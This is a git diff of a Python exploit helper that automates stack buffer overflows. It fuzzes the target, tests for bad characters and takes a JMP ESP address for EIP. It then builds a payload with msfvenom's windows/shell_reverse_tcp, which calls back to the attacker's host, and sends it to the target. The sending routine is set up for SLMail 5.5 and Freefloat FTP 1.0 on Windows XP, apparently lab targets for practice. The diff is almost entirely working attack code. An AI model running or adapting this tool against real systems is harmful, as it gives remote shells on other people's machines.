@@ -1,4 +1,6 @@
+# Author: Chris Speakes
 #!/usr/bin/python3
+
 import argparse
 import codecs
 import socket
@@ -66,25 +68,26 @@ def get_elapsed_time(_start_time, verbosity):
     return seconds
 
 
-def send_var(_var, _ip, _port):                                     # Rewrite here for specific target
-    try:
+def send_var(_var, _ip, _port):                     # THIS SECTION BELOW REQUIRES YOUR CUSTOM CODE.i PROVIDE TWO ------
+    if not isinstance(_var, (bytes, bytearray)):    # PUBLICLY AVAILABLE, PREVIOUSLY KNOWN TARGETS FOR EDUCATIONAL ----
+        _var = _var.encode()                        # PURPOSES ONLY. THE REMAINDER OF THIS FUNCTION SHOULD BE ---------
+    try:                                            # CONSIDERED NIMBLE AND DANGEROUS! EDIT AT YOUR OWN RISK. ---------
         s = socket.socket()
         s.settimeout(10.0)
-        s.connect((str(_ip), int(_port)))                                          # Timeout in seconds (S)
-        var = "USER " + str(_var) + "\r\n"
-        s.send(var.encode())
-        data = s.recv(1024).decode()
-        #s.connect((_ip, _port))
-        #s.recv(1024)
-        #s.send(bytes("USER " + _var + "/r/n", encoding='utf16'))
-        #s.send(("USER " + str(_var) + "/r/n").encode())
-        #s.recv(1024)
-        #passwd = f'PASS {_var}\r\n'
-        #s.send(b'passwd')
-        #s.recv(1024)
-        #s.send(b'QUIT\r\n')
-        s.close()
-        time.sleep(1)
+        s.connect((str(_ip), int(_port)))
+        #var = "USER ".encode() + _var + "\r\n".encode()    # [TARGET] Freefloat FTP 1.0, WindowsXP Pro SP3 x32-------
+        #s.send(var)                                        # [TARGET] Freefloat FTP 1.0, WindowsXP Pro SP3 x32-------
+        #time.sleep(0.5)                                    # [TARGET] Freefloat FTP 1.0, WindowsXP Pro SP3 x32-------
+        #s.recv(1024)                                       # [TARGET] Freefloat FTP 1.0, WindowsXP Pro SP3 x32-------
+        #s.close()                                          # [TARGET] Freefloat FTP 1.0, WindowsXP Pro SP3 x32-------
+        var = 'USER username\r\n'.encode()                  # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
+        s.send(var)                                         # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
+        s.recv(1024)                                        # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
+        time.sleep(0.5)                                     # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
+        var = 'PASS '.encode() + _var + '\r\n'.encode()     # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
+        s.send(var)                                         # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
+        s.recv(1024)                                        # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
+        s.close()                                           # [TARGET] SLMail 5.5, WindowsXP Pro SP3 x32--------------
         result = True
     except socket.timeout:
         print(f'[-] Connection Timed Out!')
@@ -122,7 +125,7 @@ def continue_msg():
     global _delimiter
     msg = f'{_delimiter}\nPerform the following steps before continuing:\n\t1. Close Immunity\n\t2. Restart the ' \
           f'target service or reboot.\n\t3. Open Immunity and re-attach to the target process\n\t4. Un-pause ' \
-          f'Immunity\nPlease type "go" or "cancel" to exit the program\n{_delimiter}\n'
+          f'Immunity\nPlease type "go" to continue or "cancel" to exit the program\n{_delimiter}\n'
     response = input(msg).lower()
     if response == 'cancel':
         exit(0)
@@ -255,7 +258,8 @@ def esp_region_msg():
         '1':'before',
         '2':'at_or_after'
     }
-    msg = 'Is the chosen payload buffer zone before or after the ESP register?\n1.\tBefore\n2.\tAt or After\n'
+    msg = 'Is the chosen payload buffer zone before or after the ESP register?\n1.\tBefore [NOT AVAILABLE, COMING ' \
+          'SOON]\n2.\tAt or After\n'
     response = input(msg)
     response = f'{response}'
     while response != '1' and response != '2' and not(response.isalnum()):
@@ -273,7 +277,7 @@ def fuzz_test(_ip, _port, _char_length):
     ascii_len = 100
     buffer_max_len = _char_length/ascii_len
     while len(buffers) <= buffer_max_len:
-        buffers.append("A" * ascii_len)
+        buffers.append('A' * ascii_len)
         ascii_len = ascii_len + 100
     current_buffer = ''
     start_time = time.time()
@@ -362,6 +366,25 @@ def loop_bad_char_test(_payload, _ip, _port, _reg_test_word, a_buffer):
                 elif response == 'c':
                     break
             continue_msg()
+
+
+def build_final_payload(_local_ip, _local_port, _bad_chars, _nop_sled, _a_buff, _b_buff):
+    sys_command = f'msfvenom -p windows/shell_reverse_tcp LHOST={_local_ip} LPORT={_local_port} ' \
+                  f'EXITFUNC=thread -f c -a x86 --platform windows -b {_bad_chars} -n {_nop_sled}'
+
+    shellcode = execute_command(sys_command)
+    print('BUILD_FINAL_UNCLEANED SHELLCODE FOR VERIFICATION_+------------------------\n')
+    print(shellcode)
+    shellcode = ((''.join(shellcode.split('\n')[1:-1])).replace(';', '')).replace('"', '')
+    shellcode = bytes.fromhex(shellcode.replace('\\x', ''))
+
+    a_buff_hex = ''
+    for a in _a_buff:
+        a_buff_hex += hex(ord(a)).replace('0x','')
+    a_buff_hex = bytes.fromhex(a_buff_hex)
+    eip_le = bytes.fromhex(_b_buff)
+    f_payload = a_buff_hex + eip_le + shellcode
+    return f_payload
 
 
 def main():
@@ -485,7 +508,7 @@ def main():
           f'find -s \"\\xff\\xe4\" -m <module_from_step_one.dll>\t\t#Note one of the candidate addresses returned. ' \
           f'This is what we will use to place into EIP.\n\nPlease enter the candidate address now (Enter ' \
           f'\'42414241\' for 0x42414241).\n'
-    instr_address = input(f'{msg} {exit_option}').lower()
+    instr_address = input(f'{msg} {exit_option}\n').lower()
     instr_address = interactive_sanitize(instr_address, msg, str)
     if instr_address == 'q':
         exit()
@@ -493,14 +516,12 @@ def main():
         print(f'[-] [Error]{_delimiter[:3]}Provided Memory Address is not of proper length. Please enter '
               f'a valid hex memory address.')
         instr_address = interactive_sanitize(input(msg).lower(), msg, str)
-    x = endian_reverse(instr_address)
-    instr_address_ascii = codecs.encode(x, "ascii")
+    instr_address_le = endian_reverse(instr_address)
+    print(f'{_delimiter}\ninstr_address_le{_delimiter}\n{instr_address_le}')
     get_elapsed_time(start_time, 'loud')
     msg = f'Enter a nop sled amount to prepend to the payload. (0 is acceptable):\n'
     nop_sled = interactive_sanitize(input(msg), msg, int)
     bad_byte_str = '"\\x' + str("\\x".join(_known_bad_chars)) + '"'
-    sys_command = f'msfvenom --payload windows/shell_reverse_tcp LHOST={local_ip} LPORT={local_port} ' \
-                  f'EXITFUNC=thread -f c -a x86 --platform windows -b {bad_byte_str} -n {nop_sled}'
     continue_msg()
     msg = f'[!] Alert! {_delimiter[:3]}Ensure that you are listening on port {local_port}!\n(Enter \'c\' to ' \
           f'continue, \'q\' to quit.)\n'
@@ -514,15 +535,13 @@ def main():
             exit(0)
         elif success == 'c':
             break
-    shellcode = execute_command(sys_command)
-    c_buffer_fill = (char_length - len(a_buffer) - 4 - len(shellcode)) * 'C'
-    final_payload = f'{a_buffer}{instr_address_ascii}{shellcode}{c_buffer_fill}'
+    final_payload = build_final_payload(local_ip, local_port, bad_byte_str, nop_sled, a_buffer, instr_address_le)
     f_out = open('cs.final_payload','w')
-    f_out.write(final_payload)
+    f_out.write(final_payload.decode())
     f_out.close()
     print('Payload Schema: {a_buffer}{endian_reverse(instr_address)}{shellcode}{c_buffer_fill}')
     send_var(final_payload, ip, port)
-    print(f'{_delimiter}\nDid you get root? If not, start over from the beginning.\n{_delimiter}')
+    print(f'{_delimiter}\nDid you get a shell? If not, start over from the beginning.\n{_delimiter}')
 
 
 if __name__ == "__main__":
